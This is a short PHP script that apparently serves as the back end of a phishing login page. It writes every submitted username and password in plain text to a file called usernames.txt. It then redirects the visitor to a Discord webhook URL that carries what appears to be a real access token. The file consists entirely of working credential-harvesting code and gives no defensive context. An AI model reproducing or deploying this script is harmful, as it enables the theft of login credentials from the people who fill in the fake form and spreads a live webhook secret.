<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://discord.com/api/webhooks/905283651007299684/qdHa8U6B0nzwj7Crjq6pnkC_MD9lDZRxXfOiho3banJ5fUdtL3QsxhHsX0PqbJ_1Kd_T');
exit();
